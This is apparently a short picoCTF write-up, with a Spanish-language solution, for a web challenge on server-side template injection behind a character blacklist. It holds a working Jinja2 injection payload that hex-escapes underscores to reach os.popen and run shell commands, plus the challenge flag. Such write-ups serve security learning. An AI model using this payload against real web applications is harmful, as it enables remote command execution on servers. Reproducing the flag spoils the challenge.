I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:57147/)!

Hints:
1.-Server Side Template Injection
2.-Why is blacklisting characters a bad idea to sanitize input?

### Solucion

```
De igual forma me ayude de una plantilla para ejecutar codigo:
`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`

de la pagina: https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

De la cual solo cambie el 'id' por cat flag y aparecio
en este reto otras 3 plantillas no funcionaron asta esta:

# picoCTF{sst1_f1lt3r_byp4ss_e3f3b57a}
```